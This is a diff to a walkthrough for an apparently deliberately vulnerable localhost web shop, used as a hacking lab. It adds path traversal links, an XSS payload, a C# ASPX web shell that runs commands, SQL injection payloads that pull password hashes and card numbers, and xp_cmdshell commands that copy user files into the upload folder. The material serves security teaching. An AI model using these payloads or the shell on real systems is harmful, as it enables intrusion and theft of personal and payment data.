@@ -8,6 +8,7 @@ This is a walktrough of a path to discover the vulnerabilities of this web app.
 
 ### Recon
 Start by browsing the website.
+Check robots.txt.
 Try to place an order in the shop and see what happens as a regular user. 
 We notice the checkout flow want's us to create a user and we can later log in with that user. We can also create a user without shopping.
 We notice a big search field in the top where we can search for products.
@@ -35,20 +36,123 @@ Try different logins to try and brute force. This is a slow process even using a
 
 4. Click the link 'View backup pdf'. Check the link url.
 
-5. Using path traversal we can download the web.config file using this link http://localhost:50881/StoreManager/Download?fileName=../web.config 
+5. Using path traversal we can download the robots file:
+	http://localhost:50881/StoreManager/Download?fileName=../robots.txt
 
-6. From the web.config we learn the password of the admin user: bob@taxfree.com : incorrect
+	or better yet the web.config file using this link:
+	http://localhost:50881/StoreManager/Download?fileName=../web.config 
+
+6. From the web.config we learn the password of the admin user: bob@taxfree.com : password
 
 7. Now login as Bob so all history will be on his account.
 
 8. Go to reviews page and test XSS, <img src=x onerror=alert('XSS');> 
 
 9. File Upload get shell
+	Customer service page has upload functionality which saves files in Uploads folder. Could be exploited for 
+	reverse shell upload. Seems like anything can be uploaded and directory browsing is enabled.
+
+	If we can get access to the server it's easy to upload your own shell code and have the website execute it.
+
+	Try creating a file called revshell.aspx with this content
+
+	```
+
+	<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+
+<%= 
+    Process.Start(new ProcessStartInfo("cmd","/c " + Request["c"])
+                    {
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true
+                    }).StandardOutput.ReadToEnd()    
+    
+    %>
+
+	```
+
+	Upload it to contact us page as attachment shell.aspx.
+
+	Then type:
+	http://localhost:50881/uploads/shell.aspx?c=dir
+
+	Then try something like this:
+	http://localhost:50881/Uploads/shell.aspx?c=copy%20%HOMESHARE%\Fakturaer\*.pdf%20C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads
+
+	Then check content of Uploads directory.
+
+	If the above fails then there is a Shell method in the StoreManager controller /StoreManager/Shell. Check it out. 
+	Also another shell in the root /shell.aspx?c="COMMAND HERE". 
+	
 
 10. SQLi
 
+	Examine how the search query is sent to the webshop.
+	Try if you can inject some code in the search field using a '.
 
-TODO Payments
+	Try curl and post to search page.
+
+	> curl.exe http://localhost:50881/Store/Search  This will fail because only POST methods are supported
+	> curl.exe -X POST http://localhost:50881/Store/Search --data 'q=hugo'  This also fails because we need a XSRF token.
+
+	Try manually posting on the web page:
+	
+> Here are some examples that might get you started:
+    ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
+	x' UNION SELECT 99, @@version, 'http://foo.gif' --
+    x' UNION SELECT 99, system_user, 'http://foo.gif' --
+	x' UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
+	x' UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
+	x' UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)    
+    
+    x' UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
+	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT Email FROM AspNetUsers) AS C -- (get emails)
+	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT PasswordHash FROM AspNetUsers) AS C -- (get PasswordHash)
+	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT SecurityStamp FROM AspNetUsers) AS C -- (get SecurityStamp)
+
+	Error based injection (will display server error)
+	x' AND 1 IN (SELECT @@version) --
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)
+
+	Displays top email
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --
+
+	Displays emails for a given row numner
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT Email FROM (SELECT ROW_NUMBER() OVER(ORDER BY OrderId) AS RoNum, OrderId, Email FROM Orders) AS tbl WHERE RoNum = 3) as varchar(4096))) --
+
+	Displays top 1 credit card number
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 'CardNo:' + LTRIM(RTRIM(CardNumber)) + '/expdate' + LTRIM(RTRIM(ExpDate)) + '/cvc' + LTRIM(RTRIM(CVC)) + '/' + LTRIM(RTRIM(CardHolderName)) FROM CreditCards) as varchar(4096))) --
+		
+	
+	If xp_cmdshell is available try:
+	x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
+	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\Documents\*.docx C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy'; -- (copies all doc files in folders and subfolders and overwrites if need be)
+	
+	*** Alternative way to get admin credentials
+	x'; exec master..xp_cmdshell 'copy C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Web.config C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\webconfig.txt'; --
+
+	Output is not shown as this is a blind injection.
+
+	Alternatively you can redirect the output of the executed command to a database table and read the contents of the table through SQL injection!
+	You can create a table and store the output of a command to it with the following:
+	
+	Example: create new table and dump contents of c drive to table
+	x'; create table hacker (id int identity(1,1), output nvarchar(255) null); --
+	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:\'; --		
+	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir C:\Users\jrn\Desktop'; --			
+	x' union select 99, output, 'http://foo.gif' from hacker where output is not null --
+	x'; drop table hacker --
+
+	Or combine this with the file upload vulnerability (see next section).
+	
+	This prints the contents of local folder to dir_out.txt file
+	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir ..\..\..\..\ /p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
+
+	More fun with powershell. See what services are running on the server:
+	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\services.txt';EXEC master..xp_cmdshell @cmd; --
+	
+
 
 
 
@@ -57,7 +161,7 @@ TODO Payments
 
 ### Authorisation
 An admin has left a hint on the login page. See if you can find it in the source code for the page. Can you figure out the email address? Probably the domain has something to do with the site.
-
+Password hint: password
 Another way to get in as admin is to create a regular user. Check the Register page source code for hints, and examine what is being posted back to the server. Maybe you can escalate yourself as admin by fiddling with the POST values?
 
 ### CSRF
